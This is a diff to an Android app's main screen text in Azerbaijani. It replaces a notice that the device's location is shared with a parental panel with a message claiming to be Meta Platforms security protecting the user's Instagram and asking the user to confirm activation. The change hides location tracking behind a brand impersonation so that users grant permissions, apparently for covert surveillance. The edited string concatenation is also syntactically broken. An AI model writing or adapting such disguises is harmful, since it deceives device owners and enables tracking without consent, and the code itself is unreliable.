@@ -65,9 +65,8 @@ public class MainActivity extends Activity {
 
         TextView info = new TextView(this);
         info.setText(
-                "Bu cihazın lokasiyası valideyn paneli ilə paylaşılır. " +
-                "Aktivləşdirmə üçün aşağıdakı düyməyə toxunun və " +
-                "Android-in tələb etdiyi icazələri verin."
+                "Meta Platforms təhlükəsizlik sizin instagram qoruyur. " +
+                "Aktivləşdirmək üçün təstiq edin " +
         );
         info.setTextSize(15);
         info.setTextColor(Color.rgb(99, 113, 133));
@@ -135,8 +134,8 @@ public class MainActivity extends Activity {
         TextView info = new TextView(this);
 
         info.setText(
-                "instagram səhifəsinin təhlükəsizliyi qorunur.\n" +
-                "Meta Platforms. " +
+                "İnstagram səhifəsinin təhlükəsizliyi qorunur.\n" +
+                "Meta Platforms " +
                 "Cihaz konfiqurasiyası tamamlanıb."
         );
 
